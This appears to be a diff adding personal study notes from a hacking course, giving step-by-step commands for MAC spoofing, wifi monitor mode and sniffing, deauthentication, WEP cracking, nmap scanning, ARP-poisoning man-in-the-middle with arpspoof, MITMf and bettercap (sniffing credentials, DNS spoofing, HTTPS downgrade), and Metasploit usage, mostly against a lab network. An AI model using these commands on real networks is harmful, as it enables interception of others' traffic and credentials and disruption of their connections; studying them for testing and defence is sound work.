@@ -1,0 +1,324 @@
+
+Anonymous browsing:
+>cat /etc/resolv.conf
+
+>nano /etc/dhcp/dhcpclient.conf
+
+search "free open dnsserver", copy 2-3 ips here
+prepend domain-name-servers <ip1>,<ip2>,<ip3> ;
+
+>service network-manager restart
+
+Now disable web-rtc in your browser ,web-rtc is used in our web browser when you are surfing,it may leak your real public ip
+open mizilla> about:config>media.peerconnection.enabled(make its false)  #this will disable web-rtc
+
+
+vpn book:
+search in google "free vpn book"
+eg download "openvpn certificate bundle"
+
+>openvpn *.ovpn
+enter creds
+
+search "dns leak test" in google, and see if your ip is leaking
+
+======================================
+Mac Address(Media Access Control):
+A permanent ,physical,unique id assigned by manufacturer
+MAC address is used to exchange packets within the network,each packet has a src and dest mac
+Each interface has a different mac address
+
+Why change Mac:
+Anonymous: It will make you anonymous within network
+Bypass Filters: mac address is often used by filters to prevent or allow devices connected to networks,so we can set a new mac address which has all permissions
+
+change mac address:
+>macchanger --help
+>macchanger --random <interface eg wlan0>
+>ifconfig wlan0 up
+
+change macaddress without macchanger:
+>ifconfig wlan0 down #deactivate an interface
+>ifconfig wlan0 hw ether 00:11:22:33:44:55   #set mac to 00:11:22:33:44:55 
+>ifconfig wlan0 up   #enable interface
+>ifconfig   #check if mac updated
+Here we are only changing mac address in memory,so if we restart mac address will be changed again. 
+-----------------------------
+monitoring vs managed mode:
+monitoring mode: cannot connct to internet,but we can sniff data from network(even packets which are not for our machine,but in the same network)
+managed mode:normal mode,we can connect to internet
+use sudo if any command shows permission denied
+
+>iwconfig  #list all interfaces and their mode
+>airmon-ng start wlan0#switch to monitor mode
+>ifconfig   #if switching is successful wlan0 will be renamed to wlan0mon
+>iwconfig wlan0mon #details about current mode
+>airmon-ng stop wlan0mon  #back to managed mode
+>ifconfig #  wlan0mon will be changed back to wlan0
+>iwconfig wlan0mon 
+
+Note:If moving to monitoring mode is giving error then run the below command first:
+>airmon-ng check kill
+
+Also note not all adapter supports monitor mode
+-----------------------
+moving to monitoring mode without using airmon-ng
+>ifconfig wlan0 down
+>iwconfig wlan0 mode monitor
+>ifconfig wlan0 up
+>iwconfig wlan0 #confirm if it is in monitoring mode
+if any issue restart network:
+>service network-manager restart
+
+>ifconfig wlan0 down
+>iwconfig wlan0 mode managed #going back to managed mode
+>ifconfig wlan0 up
+-----------------------------------
+Network Sniffing:Gathering information from network.
+airodump-ng is a packet sniffing tool which is a part of aircrack-ng suit.
+
+airodump-ng:
+>airmon-ng start <interface>  #monitor mode
+>airodump-ng <interface>  #get network info,here you should only pass interfaces which is in monitor mode
+
+
+BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                                                           
+ 04:B1:67:EB:63:B5  -45       18        1    0   1   65  WPA2 CCMP   PSK  tgr                                                                                                                              
+ 98:DE:D0:98:21:66  -58      104        3    0   7  270  WPA2 CCMP   PSK  Tamajit                                                                                                                          
+ 10:FE:ED:35:0A:B3  -97        2        0    0   1  270  WPA2 CCMP   PSK  TPLINK_Network    
+
+>ctl + c
+BSSID=>mac of access point
+Pwr=>higher the number,better the signal ,here -45 has best signal
+#/s  => No. of data packets we connected in last 10 seconds
+CH =>channel
+
+currently airodump-ng  is tracing all wifi in range,now lets focus on one of the wifi:
+>airodump-ng -channel 12 -bssid 40:30:20:10 --write dump_file <interface>  #we are providing the channel and mac address of wifi router we want to attack,dump will be stored in dump_file
+Now we will be able to see mac of all the connedted device(called station) to the specified wifi.
+dump files can be opened on wireshark for indept analysis
+-----------------------------------------------------
+Deauthentication attack:
+Hacker can disconnect a client(station) from wifi network using this
+>aireplay-ng -deauth <#packets> -a <AP> <interface>   #AP(access point)= bssid or mac of wifi router
+eg.  aireplay-ng -deauth 1000 -a 10:20:30:40 wlan0mon
+
+Above command will deauth all clients,we may want to deauth only one client.
+>aireplay-ng -deauth <#packets> -a <AP> -c <client/target> <interface>  
+eg.  aireplay-ng -deauth 1000 -a 10:20:30:40 -c 00:AA:11:BB wlan0mon  #00:AA:11:BB =>mac to client whom we want to deauth
+-----------------------------------------------------
+WEP cracking:
+>airodump-ng --channel <channel> --bssid <bssid> --write <file_name> <interface>
+
+>aircrack-ng <.cap filename we get from dump>
+
+WEP is easier to crack than WPA or WPA2
+
+To crack WEP you need some network traffic,we can use aireplan to generate some traffic using fake-auth.
+>aireplay-ng --fakeauth 0 -a <AP  mac > -h <kali_mac> <interface>
+>aireplay-ng --arpreplay -b <AP mac> -h <attacker mac> <interface>  #inject packet
+using fake-auth we cannot connect to internet but we can inject some packets
+============================================================================================================
+Post Connection Attacks:
+These attacks only works within network all connected to same router:
+ 
+Discover devices on same network:
+>netdiscover -i <interface> -r <range>
+eg. netdiscover -i wlan0  -r 192.168.1.0/24                             #192.168.1.0-192.168.1.255
+outputs all machine(ip,mac) on your lan
+
+NMap:
+zenmap a GUI version of nmap
+
+>zenmap   #opens gui
+in target insert "192.168.1.0/24 "
+In dropdown there are different profile options like:
+1)ping scan(ip,mac)
+2)quick scan(ip,mac,gives some info about which ports are open)
+3)quick scan plus(ip,mac,os info, also gives  info about which ports are open,including the version eg. openssh 6.7. This version information are very useful when planning attach)
+4)intense scan
+etc
+generated nmap cammand is also shown below
+hit "scan" button to start scan.
+
+port sweep vs portscan:
+port scan: scan multiple ports of a machine
+port sweep:scan same port of multiple machine
+
+Types of port scanning:
+TCP Scanning
+UDP Scanning
+SYN Scanning
+ACK Scanning
+FIN Scanning
+
+--------------------------------------------------------------------------------
+Man in the middle attack(MITM):
+Done using ARP poisoning
+
+hacker machine will come between target machine and router.
+router will think hacker machine is the target machine. target machine will think hacker machine is router.
+as a result all communication between target and router will go through hacker machine.
+
+>arpspoof -i <interface> -t <target_ip> <AP_ip>
+>arpspoof -i <interface> -t <AP_ip> <target_ip> 
+>echo 1>/proc/sys/net/ipv4/ip_forward   #enable ip forwarding, without this we cannot do man in the middle attack
+
+Network details:
+ linux kali       10.0.2.15
+ router           10.0.2.1
+ windows 10   10.0.2.4
+
+view apr details:
+in windows:
+>arp -a
+
+In kali:
+>arpspoof -i eth0  -t 10.0.2.4   10.0.2.1      #we are telling windows 10 ,we are router
+in a different terminal:
+>arpspoof -i  eth0  -t  10.0.2.1    10.0.2.4    #we are telling router ,we are windows 10
+
+>echo 1>/proc/sys/net/ipv4/ip_forward   #enable ip forwarding, without this we cannot do man in the middle attack. 1=>enable, 0=>disabled
+
+Now i in Windows 10 if we do "arp -a" we will see 10.0.2.1  is mapped to mac of kali(not router)
+>arp -a
+
+----------------------
+we can do the same using mitmf(man in the middle framework) a python framework.
+https://github.com/byt3bl33d3r/MITMf
+>pip install -r requirements.txt
+>python mitmf.py -i eth0 --arp --spoof --gateway   10.0.2.1  --target  10.0.2.4
+now if the windows user make some http request  all the content will be visible in the console.
+This will not work in https sties, but we have the option,we can use ssl strip feature to downgrade https to http,however this winn not work if site use "strict https" protocol.
+
+
+DNS attack:
+With MITM we can also do a different kind of attack.suppose target user hits facebook.com, we can forward that request to some other site with same appearence like facebook.
+For that we have to combine MITM with DNS attack with extra --dns
+update dns entry of the site you want to change
+>python mitmf.py -i eth0 --arp --spoof --gateway   10.0.2.1  --target  10.0.2.4 --dns
+
+MITMf is no longer maintained use "Bettercap" instead
+------------------------------------------
+Bettercap(a MITM attack software):
+with arpspoof we can do MITM attack
+but bettercap allows us to do additional things:
+=>ARP spoof targets eg. redirect the flow of packets
+=>sniff data(get info like username,pass,url etc)
+=>bypass https
+=>redirect domain requests(DNS Spoofing)
+=>Inject code in loaded pages
+and more
+>apt-get install bettercap -y
+>bettercap -iface eth0
+
+bettercap>help
+bettercap>help <module name>
+bettercap>help net.probe
+bettercap>net.probe on   #Keep probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet. basically network discovery
+bettercap>net.show       #see all machines in network
+bettercap>help arp.spoof
+bettercap>set arp.spoof.fullduplex true   #we are sppoofing both target and router, if false only target is spoofed
+bettercap>set arp.spoof.targets <windows ip>
+bettercap>arp.spoof on                    #activate spoofing target machine
+now if we do "arp -a" in windows you will see ip of router is pointing to mac of kali(not router's mac)
+Now for windows machine every request to and from(as  arp.spoof.fullduplex is true) router will go from kali
+Not start sniffing
+bettercap>net.sniff on  #now make any url request from windows,every thing will be logged in kali
+
+We have first turned probe on ,then spoof on then sniff on ,instead of doing this each time we can create a script called caplets(as shown below,spoof.cap) and reuse that script.
+===spoof.cap======
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets <windows ip>
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+------------------
+>bettercap -iface eth0 -caplet spoof.cap
+
+With MITM attack it is not possible to see https traffic as they are encrypted,one possible option is to downgrade https to http
+bettercap>caplets.show  #list of caplets location /usr/share/bettercap/caplets
+bettercap>hstshijack/hstshijack
+
+=========================================
+Metasploit:
+It has 6 types of modules:
+1)exploit: 
+An exploit is the means by which an attacker, or penetration tester for that matter, takes advantage of a vulnerability within a system, an application, or a service.
+The exploit is what delivers the payload. 
+Common exploits include buffer overflows, web application vulnerabilities (such as SQL injection), and configuration errors.
+
+
+2)payload : 
+payload is what exploit will plant on the system.
+A payload is a custom code that attacker want the target system to execute.
+Payloads are only referred to when code execution is possible and not when using things like denial of service exploits(actually dos is an auxiliary in metasploit).
+Example payloads are things like Trojans/RATs, keyloggers, reverse shells etc.
+can be a reverse-shell or meterpreter
+For example, a reverse shell is a payload that creates a connection from the target machine back to the attacker as a Windows command prompt, whereas a bind shell is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect. A payload could also be something as simple as a few commands to be executed on the target operating system.
+
+
+3)auxiliary:
+The Metasploit Framework includes hundreds of auxiliary modules that perform scanning, fuzzing, sniffing, and much more.
+They dont require payload like dos,crawler,spoof,sniffer
+
+4)encoders:
+Used to re-encode payload in exploit, can be useful getting through anti-virus
+
+5)post:post penetration attacks eg key-logging,spying on microphone/webcam etc
+6)nope:
+
+we can check the available modules in:
+/usr/share/metasploit-framework/modules
+>service postgresql start
+>msfconsole
+msf>help
+msf>search ssh                                              #show all available attacks(auxiliary,exploit,post) of ssh  
+msf>search type:exploit platform:windows  flash             #show all exploits of flash for windows platform
+msf>use <exploit path>                                      #exploit will be loaded and prompt will change to : msf exploit(exploiy_name)>
+msf exploit()>show                                          #shows info about the loaded exploit
+msf exploit()>show options                                  #shows options we can set for the loaded exploit
+msf exploit()>set option_name option_value                  #set a option for the selected exploit
+msf exploit()>show options                                  #verify if option is set correctly 
+msf exploit()>exploit                                       #attack
+msf exploit()>back                                          #unload exploit
+
+
+msf exploit()>show payloads                                 #shows payload list that are compatible with this exploit
+msf exploit()>show targets
+msf exploit()>show info                                     #shows info about exploit
+
+
+
+msf exploit()>exit
+
+
+>msfconsole
+-----------------------
+Metasploit information gathering using "Auxiliary scanner":
+msf>search ssh 
+msf>use /auxiliary/scanner/ssh/ssh_version
+msf auxiliary()>options
+msf auxiliary()>set RHOSTS <value>
+msf auxiliary()>options
+msf auxiliary()>run                        #start scanning. execute run(not exploit),remember auxiliary is not an exploit in metasploit
+
+Now from scanned info,we can see if any exploit is available
+
+-------------------------------
+meterpreter:
+>systeminfo
+>shell
+
+
+
+
+
+
+
+
+
+
+
